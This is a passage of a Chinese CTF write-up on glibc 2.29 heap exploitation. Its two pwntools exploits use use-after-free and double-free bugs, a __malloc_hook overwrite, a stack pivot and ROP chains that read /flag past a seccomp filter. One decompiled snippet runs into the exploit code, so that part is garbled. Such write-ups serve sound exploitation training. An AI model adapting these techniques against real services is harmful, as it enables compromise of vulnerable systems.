        #leak libc
        Add(0,'a'*0x120)
        Add(1,'a'*0x400)
        Delete(0)
        Show(0)
        p.recvuntil("hero name: ")
        libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - (0x902ca0-0x71e000)
        log.success("[+]libc base => " + hex(libc_base))
        #
        for i in range(6):
            Add(0,'a'*0xf0)
            Delete(0)
        for i in range(7):
            Add(0,'a'*0x400)
            Delete(0)
        Add(0,'a'*0x400)
        Add(1,'a'*0x400)
        Add(1,'a'*0x400)
        Add(2,'a'*0x400)
        Delete(0)#UAF
        Add(2,'a'*0x300)
        Add(2,'a'*0x300)
        gdb.attach(p)
        #agagin
        Delete(1)#UAF
        Add(2,'a'*0x300)
        Add(2,'a'*0x300)
        Edit(2,'/flag'.ljust(8,'\x00'))
        Edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c460-0x555555559000))+p64(heap_base+0x1f))
        #trigger
        Add(0,'a'*0x217)
        Delete(0)
        Edit(0,p64(libc_base+libc.sym['__malloc_hook']))
        Add(0,'a'*0xf0)
        BackDoor('a')
        #mov eax, esi ; add rsp, 0x48 ; ret
        #magic_gadget = libc_base + libc.sym['setcontext']+53
        # add rsp, 0x48 ; ret
        magic_gadget = libc_base + 0x000000000008cfd6
        payload = p64(magic_gadget)
        BackDoor(payload)
        p_rdi = libc_base + 0x0000000000026542
        p_rsi = libc_base + 0x0000000000026f9e
        p_rdx = libc_base + 0x000000000012bda6
        p_rax = libc_base + 0x0000000000047cf8
        syscall = libc_base + 0x00000000000cf6c5
        rop_heap = heap_base + 0x44b0
        rops = p64(p_rdi)+p64(rop_heap)
        rops += p64(p_rsi)+p64(0)
        rops += p64(p_rdx)+p64(0)
        rops += p64(p_rax)+p64(2)
        rops += p64(syscall)
        #rops += p64(libc.sym['open'])
        #read
        rops += p64(p_rdi)+p64(3)
        rops += p64(p_rsi)+p64(heap_base+0x260)
        rops += p64(p_rdx)+p64(0x70)
        rops += p64(p_rax)+p64(0)
        rops += p64(syscall)
        #rops += p64(libc.sym['read'])
        #write
        rops += p64(p_rdi)+p64(1)
        rops += p64(p_rsi)+p64(heap_base+0x260)
        rops += p64(p_rdx)+p64(0x70)
        rops += p64(p_rax)+p64(1)
        rops += p64(syscall)
        Add(0,rops)
        p.interactive()
    exp()
## BUUCTF 新春红包赛
### 程序分析
这道题目和上面的题目非常相似，开启了除canary之外的所有保护，禁掉了`execve`。
    line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x07 0x00 0x40000000  if (A >= 0x40000000) goto 0011
     0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011
     0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010
     0006: 0x20 0x00 0x00 0x00000024  A = args[2] >> 32
     0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010
     0008: 0x20 0x00 0x00 0x00000020  A = args[2]
     0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011
     0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0011: 0x06 0x00 0x00 0x00000000  return KILL
此外程序允许`Add`的次数最多为`28`次，只能分配`0x10`、`0xf0`、`0x300`和`0x400`的堆块，只能`Edit`一次，存在`double
free`漏洞，后门里可以溢出到`rbp`和`retn_addr`进行栈迁移。绕过的条件是`*(_QWORD *)(qword_4058 + 0x800)
> 0x7F0000000000LL`或者`*(_QWORD *)(qword_4058 + 0x7F8`及`*(_QWORD *)(qword_4058
+ 0x808)`其中一个不为0，这个地址被初始化为堆基址。
    /*
    qword_4058 = (__int64)malloc(0x1000uLL);qword_4050 = qword_4058 & 0xFFFFFFFFFFFFF000LL
    */
    ssize_t __fastcall Magic(__int64 a1, __int64 a2)
    {
      char buf; // [rsp+0h] [rbp-80h]
      if ( *(_QWORD *)(qword_4058 + 0x800)  " + hex(heap_base))
        #leak libc
        for i in range(2,8):
            Delete(i)
        Show(7)
        libc_base = u64(p.recvline().strip('\n').ljust(8,"\x00")) - (0x7ffff7fb4ca0-0x7ffff7dd0000)
        log.success("libc base => " + hex(libc_base))
        libc.address = libc_base
        p_rdi = libc_base + 0x0000000000026542
        p_rsi = libc_base + 0x0000000000026f9e
        p_rdx = libc_base + 0x000000000012bda6
        p_rax = libc_base + 0x0000000000047cf8
        syscall = libc_base + 0x00000000000cf6c5
        leave_ret = libc_base + 0x0000000000058373
        #
        #add 6 bins to tcache[0x100]
        #for i in range(8,13):
        #    Delete(i)
        Add(0,0x300,"0")#cut 0x410->0x310+0x100
        Add(1,0x300,"1")#put 0x100 to small bin in order to be in tcache
        Delete(9)#7 & 9
        Add(2,0x300,"2")
        Add(3,0x300,"3")
        #now we write sth
        rop_heap = heap_base+(0x55555555c700-0x555555559000)
        #open
        rops = "/flag\x00\x00\x00"
        rops += p64(p_rdi)+p64(rop_heap)
        rops += p64(p_rsi)+p64(0)
        rops += p64(p_rdx)+p64(0)
        rops += p64(p_rax)+p64(2)
        rops += p64(syscall)
        #rops += p64(libc.sym['open'])
        #read
        rops += p64(p_rdi)+p64(3)
        rops += p64(p_rsi)+p64(heap_base+0x260)
        rops += p64(p_rdx)+p64(0x30)
        rops += p64(p_rax)+p64(0)
        rops += p64(syscall)
        #rops += p64(libc.sym['read'])
        #write
        rops += p64(p_rdi)+p64(1)
        rops += p64(p_rsi)+p64(heap_base+0x260)
        rops += p64(p_rdx)+p64(0x30)
        rops += p64(p_rax)+p64(1)
        rops += p64(syscall)
        #rops += p64(libc.sym['write'])
        rops = rops.ljust(0x300,'\x00')
        Edit(9,rops+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c1e0-0x555555559000))+p64(heap_base+(0x555555559a60-0x555555559000)-0x10))
        #gdb.attach(p,'b* 0x0000555555554000 + 0x144d')
        Add(0,0xf0,"1")#put 0x100 to small bin in order to be in tcache
        #now we rop
        payload = "a"*0x80+p64(rop_heap)+p64(leave_ret)
        Suprise(payload)
        p.interactive()
    exp()
## 总结
这种攻击方式的利用结果和`unsorted bin attack`的结果非常相似，有望成为`glibc
2.29`下替代后者的新兴手段。另外据`AngelBoy`的回复，Hitcon另一题`LazyHouse`其中也用到了这种攻击方式，大家可以实践一下。
## 参考
[berming](https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312)